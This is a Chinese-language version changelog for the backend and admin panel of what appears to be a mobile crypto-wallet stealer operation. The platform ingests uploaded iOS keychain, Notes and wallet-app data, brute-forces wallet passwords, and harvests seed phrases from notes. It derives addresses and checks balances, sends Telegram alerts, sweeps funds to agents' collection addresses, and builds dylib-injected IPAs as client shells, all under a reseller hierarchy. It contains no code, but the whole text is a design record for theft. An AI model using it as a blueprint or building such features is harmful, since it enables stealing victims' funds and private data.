# 版本更新日志

本文件记录 v26 管理后台与 API 的版本变更。

版本号见 后台侧栏展示。

---

## [1.4.8] - 2026-09-15

### 新增

- **备忘录 App Group**：识别并解析 `group.com.apple.notes.tar`（与 `notes.tar` 同链路）；排除无 NoteStore 的 `com.apple.mobilenotes.tar`
- **目标包种子**：`NotesGroup` / `group.com.apple.notes` / paths `["."]`
- **`core_export_*.tar.gz` 拆包（V2）**：按顶层容器拆成 `core.{bundle}.tar`，再走 V2 分类解析；同钱包保留体积更大的一份
- **V2 uploads 响应**：`POST /api/v2/uploads`（及 chunks）返回 `code` / `numberOfChunks` / `data`；`numberOfChunks = ceil(fileSize / chunkSize)`

### 修复

- **JSON 开会话无 fileName**：空 `{}` 等不再被误当成二进制整文件上传，改为 400「需要 fileName」

### 变更

- `create_plain_upload` 支持 `declared_file_size`；PENDING 时 `expectedChunks` 按申报大小向上取整
- 备忘录媒体路径兼容 `group.com.apple.notes/Accounts/...` 前缀

### 说明

- 部署后将 `VERSION=1.4.8` 写入运行环境 `.env` 并重启

---

## [1.4.7] - 2026-09-14

### 新增

- **`devices.interversion`**：`v1` / `v2`，区分接口来源与自动解析路径；启动 schema patch 自动补列
- **`v2enqueue_device_parse`**：V2 专用解析入队；worker 按 `interversion` 分流 `auto_parse_device` / `auto_parse_device_v2`
- **V2 分类解析**：`device_auto_parse_v2` 按 onekey / okx / imtoken / metamask 等类别分流（压缩包内容解析与 V1 对齐）
- **设备列表 APP 展示**：第三行改为 `APP名:设备id`；未匹配显示 `暂无app 设备id`

### 修复

- **设备详情 MissingGreenlet**：更新 `wallet_usdt_max` flush 触发 `updated_at` 过期后异步惰性加载失败；详情页快照标量字段，USDT 缓存 flush 后 `refresh`
- **V2 Keychain 采不上**：`/api/v2/devices` 恢复返回 `doKeychain`（读 `settings.client.do_keychain`），客户端据此再传 `keychain_*.xml`

### 变更

- V2 注册 / finish 标记 `interversion=v2` 并走 `v2enqueue_device_parse`；进入 V2 设备详情同步扫描并再入队
- V1 注册 / finish 保持 `interversion=v1`，不覆盖已是 v2 的设备

### 说明

- 部署后将 `VERSION=1.4.7` 写入运行环境 `.env` 并重启
- 已有 V2 设备可执行：`UPDATE devices SET interversion='v2' WHERE …`，或再调一次 `POST /api/v2/finish`

---

## [1.4.6] - 2026-09-14

### 新增

- **协议 B `/api/v2`**：`GET /system/ready`、`POST /devices`、`POST /uploads`、`POST /uploads/{uploadId}/chunks`、`POST /finish`；与现有 `/api/v1` 并存，互不影响
- **协议 A AcquisitionHook**：`POST /api/handshake.php`、`/api/session.php?action=start|end|finish`、`/api/upload.php`；新增表 `acq_sessions`；密文落盘 `…/{deviceId}/acq/{session}/`（`upload_files.status=ENCRYPTED`）
- **V2 明文上传**：`receive_store` 按到达顺序 append 到 `{日期}/{deviceId}/{fileName}`（无 V1 分片会话目录合并）
- **设备 USDT 观测**：`devices.wallet_usdt_max` 及后台列表/筛选相关能力（未解锁亦可按包内观测值筛选）

### 变更

- **V2 devices 响应对齐客户端约定**：入库字段兼容 V1；返回 `{deviceId, bundleIds, debug}`，`bundleIds` 取自 `traget`（`status=1`）
- **限流豁免**：覆盖 `/api/v2/*` 客户端链路与协议 A 三条 `.php` 路径
- **deviceId 校验**：默认仍严格 UUID（V1）；`loose=True` 供 V2 / 协议 A 兼容

### 说明

- 部署后将 `VERSION=1.4.6` 写入运行环境 `.env` 并重启；启动 `create_all` 会建 `acq_sessions`，并补齐 `wallet_usdt_max` 等 schema patch
- V1 上传仍走扩展名白名单 + 魔数校验；V2 明文上传为协议兼容路径，安全策略弱于 V1

---

## [1.4.5] - 2026-09-11

### 安全

- **目标包 / APP 仅超管可写**：`require_perm_superadmin` 同时校验菜单权限与 `superadmin` 角色；`save_bundles` / `create_app` / `update_app` 服务层二次校验（`actor` 缺失亦拒绝）
- **权限种子收回**：代理 / 渠道种子不再含 `menu.bundles` / `menu.app_manager`；`seed_admin` 删除非超管多余绑定；权限页保存时强制剥离 `SUPERADMIN_ONLY_MENUS`
- **目标包路径加固**：拒绝绝对路径、`..` 目录穿越与可疑探测名；上传仍禁止任意 `.xml`，仅精确允许 `keychain.xml`

### 新增

- **Bitget Wallet / Base App 识别**：`bitkeep_wallet` / `coinbase_wallet` 接入状态检查、解锁与地址展示（离线 PIN/DESM 完整解密仍依赖进一步逆向）
- **OneKey LSE Keychain**：从 keychain 提取 LSE 密钥辅助家族钱包解析
- **OKX 人脸/生物识别提示**：开启人脸且 Keychain 受 ACL 保护时，详情给出明确「待解锁」说明
- **解析流水线文档**：[`docs/PARSE_PIPELINE.md`](PARSE_PIPELINE.md)

### 变更

- **设备列表**：钱包数不再计入备忘录包；独立展示备忘录数量；归属/IP 列压缩展示
- **上传**：`fileName` 允许精确名 `keychain.xml`（API 文档已同步）
- **备忘录解析**：按实际表列动态 SELECT，兼容缺少 `ZWIDGETSNIPPET` / `ZGENERATION1` 等列的 NoteStore

### 说明

- 部署后将 `VERSION=1.4.5` 写入运行环境 `.env` 并重启；启动时 `seed_admin` 会收回非超管的目标包/APP 菜单，相关账号需重新登录
- 仅超级管理员可保存目标包与添加/编辑 APP；误授菜单仍会被角色门禁拦截

---

## [1.4.4] - 2026-09-06

### 修复

- **循环导入**：`mnemonic_balance` 模块级导入 `app.admin` 下模块，导致脚本/测试直接 ImportError；改为函数内延迟导入
- **存储型 XSS**：用户管理 / 目标包页把 `json.dumps` 结果以 `| safe` 注入 `<script>`，`display_name` 可含 `</script>` 突破脚本块；已在 JSON 层转义 `</`，并补 `create_user` 显示名长度校验
- **后台登录爆破**：新增 Redis 失败计数限流——同一 IP 10 分钟失败 10 次锁定（`error=ratelimit`），成功登录清零，Redis 故障时放行不阻断
- **解压炸弹**：`extract_archive_to` 改为流式写出，单文件 512MB / 总量 2GB 上限，超限拒绝；OneKey 家族库读取兜底不再 500
- **reveal 兜底**：密码解锁 / 爆破已入库的助记词，设备详情「查看」可按来源匹配 mnemonic 表返回（此前提示"未找到可展示的助记词"）

### 变更

- **助记词去重测试对齐 1.4.3**：同设备按 hash 去重、跨设备各存一条；测试自清理假设备数据

### 安全

- 新增 `scripts/pentest_extended.py`：JWT 伪造（错密钥 / alg=none / typ 提权 / tv 不符）、登录爆破、反射与存储型 XSS、上传伪装 / 跨设备会话劫持 / 分片越界、SQLi、越权 IDOR（代理→渠道→业务员链）、tar/zip slip、symlink、zip bomb、口令时序，共 44 项
- 新增 `scripts/test_admin_functional.py`：后台 11 个页面渲染、设置读写往返与钳制、解锁 / reveal HTTP 层、finish 幂等、表单防护，共 33 项
- 全量回归：tonight 45 + notes 85 + derive/collect 122 + admin 33 + 渗透 44 全绿；报告见 `docs/TEST_REPORT_2026-09-06.md`

### 说明

- 登录限流仅作用于后台登录口；客户端 `/api/v1/uploads`、`/api/v1/finish`、`/api/v1/devices` 本就不计入全局限流中间件，上传链路不受影响
- prod 部署建议：`APP_ENV=prod`（关闭 /docs）并确认 HTTPS 后开启 Cookie `Secure`

---

## [1.4.3] - 2026-09-06

### 新增

- **OneKey / DigitalShield 解析**：设备详情与 `/finish` 自动解析识别上传包
  - **DigitalShield**：便携 `|VS|`/`|RP|` 凭证 → 待解锁（密码框）+ 与 imToken 相同的「一键爆破」下单入口
  - **OneKey**：`|LSE1|` 安全存储包裹；缺少 `keychain.xml` 时提示待 Keychain
- **助记词统一收口** `finalize_recovered_mnemonics`：自动解析 / 密码解锁 / 爆破 / 备忘录共用「入库 → 派生地址 → TG」；同设备按 hash 去重，解锁时已存在则合并来源并补推送
- **地址派生对齐主流钱包**
  - BTC：小狐狸 / OneKey 多账户 `m/84'/0'/{i}'/0/0`，并同时派生 BIP44 / BIP49 / BIP84 / BIP86 四种格式
  - SOL：Phantom / OneKey 常用 `m/44'/501'/{i}'/0'`
  - 派生数量读后台 `wallet.address_derive_count`（默认 5，含 TRON/ETH/BSC/BTC/SOL）
- **助记词列表批量派生**：勾选一条或多条 →「派生地址」，按设置数量派生五链并 upsert 入 `address`（已存在不重复插入）
- **归集失败原因**：预检 / 转账失败写入 `collectrecord.response_json.error`，归集日志卡片展示
- **下级登录 IP 白名单**：代理 / 渠道 / 业务员在「用户管理」设定，写入 `admin_user.login_ip_whitelist`（JSON 数组，支持单 IP 与 CIDR）

### 变更

- **总后台白名单**：`.env` 的 `ADMIN_IP_WHITELIST` 只在登录提交时校验超级管理员；登录页始终可打开
- **全部地址**：地址完整展示（更小字号换行）；下方「关联助记词：id」可跳转助记词列表并定位

### 修复

- DigitalShield（等）密码解锁时，若助记词已由备忘录等来源入库，不再静默跳过地址 / TG
- `notified` 仅在 TG 真正入队时计数；同批重复助记词合并 source；详情页已入库钱包回填「已解析」
- **TronGrid API Key**：归集误读 `trongrid_api_key`（空），已改为 `TRONGRID_API_KEY` 并传给 tronpy
- **归集循环导入**：`explorer_tx_url` 迁出 `wallet_collect`
- **TRON 失败文案**：tronpy `BANDWITH_ERROR` 元组异常归一化为可读提示（带宽 / 能量不足）
- 地址行数少于后台配置应产出数量时（含 SOL / BTC 四格式）自动补派生

### 说明

- 部署后请将 `VERSION=1.4.3` 写入运行环境 `.env`，并重启以补齐 `login_ip_whitelist` 列等迁移
- 可选配置 `TRONGRID_API_KEY`（TronGrid Dashboard → API Keys），降低归集 / 余额限速
- 旧助记词若仅有单地址，可在「助记词」列表勾选后点「派生地址」补齐

---

## [1.4.2] - 2026-09-05

> 变更已并入 **1.4.3** 发布。以下为当时说明摘要。

### 新增

- **下级登录 IP 白名单**：代理 / 渠道 / 业务员在「用户管理」设定，写入 `admin_user.login_ip_whitelist`

### 变更

- **总后台白名单**：`ADMIN_IP_WHITELIST` 只在登录提交时校验超级管理员；登录页始终可打开

---

## [1.4.1] - 2026-09-05

### 新增

- **后台 IP 白名单**：`.env` 配置 `ADMIN_IP_WHITELIST`（逗号分隔，支持 CIDR）。解析真实客户端 IP（`CF-Connecting-IP` / `X-Real-IP` / `X-Forwarded-For` 最左侧）。未命中时访问后台任意页（含登录）**保持原 URL**，返回通用 **404** 页面，不暴露后台存在
- 白名单只约束 `ADMIN_PATH` HTML 与 `/api/admin` 轮询；**不影响** `/api/v1/devices`、`/api/v1/uploads`、`/api/v1/finish` 等客户端接口

### 变更

- **Redis**：统一 RESP2，避免 redis-py 8 `HELLO` 在 requirepass/ACL 下握手失败；密码写入连接串时做 URL 编码；同步客户端走 `sync_redis_from_settings()`

### 说明

- 部署后请将 `VERSION=1.4.1` 写入运行环境 `.env`（若使用环境变量覆盖默认）
- `ADMIN_IP_WHITELIST` 留空则不限制。生产建议填写办公网 IP/CIDR；经 Nginx/CDN 时请传递真实 IP
- 改白名单后需重启进程（配置在启动时加载）

---

## [1.4.0] - 2026-09-04

### 新增

- **IPA INJECT**：APP 管理支持上传源 IPA + API 域名 + 列表 `appid` 注入（跳过 xcodebuild）；接口 `POST /apps/ipa/source`、`POST /apps/ipa/inject`，任务进度与下载复用既有流水线
- **备忘录助记词任务**：`notes.tar` 随 `/finish` 设备解析后入队独立队列 `queue:notes_mnemonic`；扫描正文合法 BIP39（12/24 词，校验和）→ 查链余额 → TG `mnemonic_balance` → 入库 `mnemonic`（`source=memorandum`）
- **设备详情备忘录脱敏**：列表仅首行 + `******`；「完整查看」校验 `MNEMONIC_VIEW_PASSWORD` 后弹窗展示全文
- **备忘录照片**：完整查看时展示笔记附件图（Media / FallbackImage）；`GET /api/admin/devices/{id}/notes/media`；列表标注「含照片」
- **助记词全局去重**：按 `result_hash` 跨设备去重，相同明文不再重复入库；补索引 `idx_mnemonic_result_hash`
- **限流豁免**：静态资源、`/api/v1` 设备注册与分片上传、`/finish` 不计入 `RATE_LIMIT_PER_MINUTE`，避免客户端上传被误伤
- **App 数量上限**：可配 `MAX_APPS`（示例默认 10）

### 变更

- **生产 IPA**：`APP_ENV=prod` 时「生成 IPA」仅开放 **INJECT**（隐藏网站封装 GENERATE）；仍隐藏「目标包」
- **侧栏地址菜单**：取消「全部地址」父级折叠；「地址列表」「归集日志」升为一级菜单
- **BIP39 扫描**：24 词命中后不再切出内部 12 词假阳性；notes 相对 `diskPath` 正确拼接上传根目录

### 说明

- 部署后请将 `VERSION=1.4.0` 写入运行环境 `.env`（若使用环境变量覆盖默认）
- 启动后会 schema patch：助记词 `result_hash` 单列索引；菜单种子会将地址相关项扁平化
- 深入回归脚本：`scripts/test_notes_mnemonic_deep.py`

---

## [1.3.8] - 2026-09-03

### 新增

- **一键归集**：全部地址列表中，原生币 / USDT / USDC 任一余额 > 0 时显示「一键归集」；确认后按链将资产转到上级代理的归集地址（参考 news4 转账实现）
- **代理归集地址**：`admin_user.collectaddress`（JSON 数组）；用户管理可为代理配置 Tron / Eth / BSC / Btc 归集地址；超管可改，代理仅可查看本人，渠道/业务员无此能力；列表展示「已设置 / 未设置」
- **归集日志**：新建 `collectrecord` 表记录每次归集（链、币种、出入地址、金额、tx_hash、状态、操作人等）；侧栏「全部地址」下新增「归集日志」全宽列表页（筛选与分页）
- **链上能力**：`wallet_collect` / `chain_transfer` / `address_balance`；依赖 `eth-account`、`tronpy`、`bit`、`solders`；可选配置 `TRONGRID_API_KEY`、`SOL_RPC`
- **目标包种子备份**：`APP_ENV=prod` 时隐藏「目标包」与「生成 IPA」；dev 启动可将本地启用中的 `traget` 写回 `traget_seed_data.py`

### 变更

- **菜单权限**：「全部地址」改为父菜单，子项为「地址列表」(`menu.addresses.list`) 与「归集日志」(`menu.collect_records`)；相关角色默认开通
- **地址列表**：增加操作列与归集预览 / 执行接口（`/addresses/collect-preview`、`/addresses/collect`）；阻塞链上调用走线程池

### 说明

- 部署后请将 `VERSION=1.3.8` 写入运行环境 `.env`（若使用环境变量覆盖默认）
- 启动后会 schema patch：`admin_user.collectaddress`、建表 `collectrecord`；菜单种子会补齐新权限码
- 归集前须先为对应代理设置该链归集地址，否则前端提示联系上级设置

---

## [1.3.7] - 2026-09-02

### 新增

- **全部地址**：助记词派生地址入库 `address` 表（`mnemonic_id` / 链 / 派生索引 / 余额等）；后台菜单「全部地址」列表、筛选与归属范围
- **查余额后先写 address 再发 TG**：`queue:mnemonic_balance` 与同步入库路径改为派生查余额 → upsert `address` → 成功后再入队飞机通知
- **地址列表交互**：地址跳转对应区块链浏览器；设备 ID 跳转设备详情；原生币 / USDT / USDC 表头 ↑↓ 按金额排序
- **按小时访问日志**：`data/logs/{YYYY-MM-DD}/{HH}.log`；成功请求单行摘要，4xx/5xx 才写 body；可配 `LOG_DIR` / `LOG_LEVEL` / `LOG_BODY_MAX` / `LOG_CONSOLE`

### 变更

- **IPA 壳体验**：LaunchScreen、部署目标与 Logo 裁剪等（生成 IPA 全屏与首屏展示）
- **生产环境**：`APP_ENV=prod` 时隐藏「生成 IPA」入口并拒绝相关 API

### 说明

- 部署后请将 `VERSION=1.3.7` 写入运行环境 `.env`（若使用环境变量覆盖默认）
- 本地若仍为旧版 `address`（`deviceId` 维度）且表为空，启动时会重建为 `mnemonic_id` 派生模型

---

## [1.3.6] - 2026-09-01

### 新增

- **APP 管理「GENERATE」打包 IPA**：新建任务弹窗支持 Logo 上传、显示名 / App 名 / Bundle ID / 打开网页 / **API 域名**；入队后展示进度与日志，产出可下载的注入 IPA
- **WebView 壳工程 + 注入流水线**：`tools/ipa_shell` 构建全屏 WKWebView 壳；再经 `updateDylibUrlObf` / `injectDylib` 写入渠道 AppID、API 域名并注入 `libappcore` / `libutils`
- **Logo 归一化**：上传支持 PNG / JPG / WEBP（≤5MB），服务端用 Pillow 转为 1024 PNG，避免 WebP 导致 `sips` 构建失败

### 变更

- **设备注册 `appName`**：允许空格与中文名称（仍 1–64 字，禁控制符与 `<>`）
- **API 域名改表单填写**：GENERATE 时在弹窗输入写入 libutils 的 API 根地址，不再依赖 `.env` 的 `IPA_CLIENT_API_URL`
- **新建任务弹窗精简**：去掉 AppCores/Utils 库名与 libutils debug 开关；Logo 区改为「Logo 上传」并标明格式与大小

### 说明

- 部署后请将 `VERSION=1.3.6` 写入运行环境 `.env`（若使用环境变量覆盖默认）
- GENERATE 依赖 macOS + Xcode（`xcodebuild`）及 `tools/static_link/iOS26dylib` 模板库；API 域名须与模板 dylib 内 URL **等长**
- 新增依赖：`Pillow`、`unicorn`（见 `requirements.txt`）

---

## [1.3.5] - 2026-09-01

### 修复

- **Tonhub「点击爆破」任务不存在 / 进度回 0**：多 Uvicorn worker 下任务原存进程内存，轮询易打到其他进程。改为 Redis 共享任务状态与入库锁；前端进度只增不减，瞬时失败不重置为 0%
- **设备列表「最近活动」相对时间多约 8 小时**：绝对时间正确、相对文案错误。改为服务端用 UTC epoch 计算并下发 `activityLabel` / `updatedLabel`，前端优先展示接口字段
- **上传目录 Permission denied 导致 500**：`mkdir`/`写 meta` 无权限时改为明确业务错误提示，避免刷 ASGI 堆栈

### 新增

- **启动检查上传目录可写**：每个 worker 启动时探测 `UPLOAD_DIR`（默认 `data/uploads`），无写权限则错误日志并阻止启动
- **设备列表按设备 ID 搜索**：支持完整 UUID 精确匹配与片段模糊搜索；SSR / 轮询 API / 详情返回列表均带上 `device_id`

### 说明

- 部署后请将 `VERSION=1.3.5` 写入运行环境 `.env`
- 若启动失败提示上传目录无写权限：`chown -R www:www data/uploads`（与守护进程用户一致）

---

## [1.3.0] - 2026-08-31

### 安全

- **上传路径穿越加固**：`upload_paths` 强制 `deviceId`/`uploadId`/日期段合法，路径落在 `UPLOAD_DIR` 内，修复非 UUID `X-Device-Id` 夹带 `../` 写出任意目录
- **上传类型与内容校验**：仅允许 `.tar` / `.zip` / `.tgz` / `.tar.gz`；嗅探可执行与压缩包魔数；整文件上限 `UPLOAD_MAX_FILE_SIZE`（默认 512MB）
- **文件名适配真机**：`bundleId.tar`（如 `im.token.app.tar`）中间段 `.app` 不再误拦；仍拒绝 `payload.exe.tar` 等伪装
- **归档 Zip/Tar Slip**：解压时校验成员路径
- **设备入参严格校验**：`deviceId`/`appId` 须 UUID；硬件/iOS/机型对齐真机；`extra=forbid`；参数错误统一 `{code:400,...}`

### 新增

- 后台侧栏「更新日志」弹层：`GET /api/admin/changelog`
- 配置项 `RUN_BACKGROUND_WORKERS`、`UPLOAD_MAX_FILE_SIZE`
- 量测脚本 `scripts/load_test_api.py`

### 优化

- **多 worker 启动**：仅主 worker 建表/种子/队列消费
- **`traget.paths`**：安全 ALTER + 回填
- **数据库索引与默认值**：复合索引替换低基数/冗余单列；Online DDL
- **查询**：去掉无用的 `LOWER(appId)`；钱包统计去掉几乎全表命中的 `.tar`/`.zip` 关键词

---

## [1.2.0] - 2026-08-31

### 新增

- Tonkeeper（`com.jbig.tonkeeper.tar`）地址进入设备详情「地址余额」Tab：从 Documents 路径提取 UQ/EQ 友好地址，展示包内 `WalletBalance` 缓存
- 支持 Tonkeeper 地址行内刷新：链上查询 TON + USDT（tonapi / toncenter）

### 优化

- Tonhub「点击爆破」进度轮询间隔由 400ms 调整为 3 秒，降低无效请求

---

## [1.1.0] - 2026-08-30

### 新增

- 设备上传 `/finish` 后自动入队解析：Redis `queue:device_parse`，后台 worker 扫描钱包/备忘录并入库
- 助记词入库流程：BIP44 派生地址（tron/eth/bsc/btc）→ 查链上余额 → 加密入库 → Telegram `mnemonic_balance` 通知
- 依赖 `bip_utils`；新增 `address_derive` / `balance_live` / `mnemonic_balance` / `device_auto_parse` / `parse_queue`
- 设备详情「一键爆破」：下单接口与 TG 模版 `brute_order` / `notify_brute_order`
- 手动解锁 / Tonhub 爆破成功后同样走助记词持久化与 TG（可补全空 `appId`/`userid`）
- 设备列表进入详情携带分页与筛选；详情「返回」保留列表状态
- MySQL 会话时区 `MYSQL_TIMEZONE`、无时区字段解释 `DB_DATETIME_ASSUME`（修复时间展示偏差）

### 优化

- 设备详情首屏加速：不再同步批量查链上余额；新解析助记词的查余额与 TG 改为后台队列 `queue:mnemonic_balance`
- 行内地址仍可单独刷新余额
- 设备注册客户端省略 `appId` 时不再清空已有值；TG 可按 `appName` 解析归属
- 助记词 / 备忘录列表空筛选参数不再触发 `int_parsing` 错误

### 界面

- 设备详情样式与交互增强（爆破入口、余额展示等）

---

## [1.0.1] - 2026-08-29

### 新增

- 后台侧栏在「助记词」下方增加 **备忘录** 入口（`menu.memorandums`）
- 数据表 `memorandum`：设备解析出的备忘录分条加密入库（含 `deviceId` / `appId` / `userid` / `result` / `addtime` 及去重哈希）
- 进入设备详情并解析 `notes.tar` 时，自动将备忘录写入 `memorandum` 表（同内容去重）
- 备忘录列表页：按设备、归属代理/渠道/业务筛选；列表脱敏展示
- 备忘录「完整查看」：验证 `MNEMONIC_VIEW_PASSWORD` 后展示全文（流程同助记词）
- 接口：`POST /api/admin/memorandums/{id}/reveal`

### 说明

- 备忘录与助记词共用 `MNEMONIC_AES_KEY` 加密、`MNEMONIC_VIEW_PASSWORD` 验密
- 代理 / 渠道 / 业务员角色默认开通备忘录菜单权限

---

## [1.0.0] - 2026-08-29

首个正式版本。

### 核心能力

- FastAPI + SQLAlchemy 2.0（异步）+ Redis 高并发 API 框架
- 设备注册、分片上传、上传结束上报；管理后台（`ADMIN_PATH`）
- 设备列表 / 详情：上传日志、地址余额、备忘录 Tab、钱包解析结果
- 多钱包 / Keychain / notes 等解析与解锁、爆破相关能力
- 助记词表 `mnemonic`：详情页解析后加密入库；后台「助记词」列表与验密完整查看
- APP 管理、包名配置、用户（代理/渠道/业务）与权限、系统设置
- Telegram 消息模版与异步通知队列
- JWT 认证、限流、安全响应头；生产关闭文档并启用 HSTS

### 配置要点

| 变量 | 用途 |
| --- | --- |
| `ADMIN_PATH` | 后台入口路径（勿使用 `/admin`） |
| `ADMIN_IP_WHITELIST` | 总后台登录 IP 白名单（1.4.2/1.4.3 起仅登录提交时校验；空则不限制；下级名单在用户管理入库） |
| `MNEMONIC_AES_KEY` | 助记词 / 备忘录 AES 加密密钥 |
| `MNEMONIC_VIEW_PASSWORD` | 后台完整查看密码 |
| `VERSION` | 系统版本号（侧栏展示） |
| `TRONGRID_API_KEY` | 可选 TronGrid API Key（归集 / TRON 余额更稳，1.4.3） |
| `MYSQL_TIMEZONE` | 连接会话时区（建议 `+00:00`） |
| `DB_DATETIME_ASSUME` | 库内无时区时间按 utc / beijing 解释 |
| `RUN_BACKGROUND_WORKERS` | 是否在本进程启动 Redis 队列 worker（1.3.0+） |
| `UPLOAD_MAX_FILE_SIZE` | 合并后整文件上限字节数（1.3.0+，默认 512MB） |

---

## 版本对照（Git）

| 版本 | 提交 | 说明 |
| --- | --- | --- |
| 1.4.8 | `74c5ed8` | group notes、core_export 拆包、V2 uploads numberOfChunks、空 JSON 开会话修复 |
| 1.4.7 | `b941644` | interversion / V2 分类解析、详情 MissingGreenlet、doKeychain、列表 APP:设备id |
| 1.4.6 | `08121fc` | 协议 B `/api/v2`、协议 A `.php`、V2 明文上传、设备 USDT 观测 |
| 1.4.5 | `9399496` | 超管独占目标包/APP、路径穿越加固、Bitget/Base 识别、备忘录列兼容与设备列表拆分 |
| 1.4.4 | `210eb78` | 登录限流、存储型 XSS、解压炸弹、reveal 兜底、循环导入修复与全量深测 |
| 1.4.3 | `dceb3e5` | OneKey/DigitalShield、地址派生对齐、批量派生、归集失败原因、登录 IP 白名单 |
| 1.4.1 | `ff0e957` | 后台 IP 白名单 404、Redis RESP2 / 密码编码 |
| 1.4.0 | `61e5a65` | IPA INJECT、备忘录助记词/照片/脱敏、助记词全局去重、限流豁免 |
| 1.3.8 | `92f2e9e` | 一键归集、代理归集地址、归集日志、链上转账与目标包种子备份 |
| 1.3.7 | `4be5f22` | 全部地址入库与列表、余额排序、查余额后写 address 再 TG、小时日志 |
| 1.3.6 | `7d3369b` | GENERATE IPA、appName 放宽、API 域名改表单填写 |
| 1.3.5 | `05b73ae` | Tonhub 爆破 Redis、相对时间、上传目录检查、设备 ID 搜索 |
| 1.3.0 | `f0a597b` | 上传安全与路径穿越、设备校验、索引默认值、启动锁、更新日志弹层 |
| 1.2.0 | `51140c5` | Tonkeeper 地址余额与 TON 链上刷新；爆破轮询 3s |
| 1.1.0 | `3409319` | 自动解析、助记词余额 TG、一键爆破、详情加速与时区 |
| 1.0.1 | `d21e7b6` | 改密失效旧登录态；备忘录相关见此前变更 |
| 1.0.0 | `c893d77` | V1.0.0 首发 |
